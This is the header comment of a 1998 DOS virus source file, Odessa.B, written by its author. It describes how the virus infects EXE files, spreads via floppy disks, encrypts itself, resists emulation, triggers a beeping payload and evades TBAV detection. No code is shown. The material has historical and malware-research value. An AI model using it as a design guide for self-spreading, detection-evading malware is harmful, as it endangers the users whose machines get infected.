;                              Odessa.B virus
;                       (C) Opic [CodeBreakers '98]
;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
;Odessa.B variant is a continuation of Odessa (aka opic.727)
;
;Odessa.B's NEW features:
;
;-Odessa.B will NOW infect .Exe files present on any floppy disks 
; undetectably (due to a critical error handler).  It does so after
; the current HDD is infected. When Odessa.B is present on a floppy
; disk it will move imediatly to the HDD to insure infection of new systems.
;Thus making it a viable floppy born virus (one of the few outside of the
;BS/MBR families)
;
;-an expanded encryption loop 
;
;-some minor bug fixes, and optimisations. 
;
;Infected files grow approximatly: 745 bytes
;
;Old features:
;
;-Exe file infector 
;-directory transversal via dotdot
;-is Windows compatable (ie: will not infect: Windows NE, PE, LE files ect.)

;-some anti-emulation
;-payload criteria: the virus will activate its payload on 
; either the 13th or the 6th of any given month provided the seconds
; are below 30.
;
;-payload: when activated the virus will beep 6 times before the 
; infected file is run. I choose this more subtle payload because
;it is easily missed, and only creates a bit of curiosity at most.
;which is a good aspect since the fact that all infected files will
;try to access the floppy drive before running also brings some curious.
;Its also somewhat humerous because the telltale signs of this virus
;are also what many non-computer literate people constantly write to
;AVers about complaining of (to which the AVs constant reply is:
;false alarm. There is a signature line:
;Odessa.B (c) Opic [Codebreakers 1998] 
;I have left for the AV to rename for me, as it is never displayed 
;(hell i figure their gonna anyways :P ).
;
;detected: Not detected by TBAV as second gen.
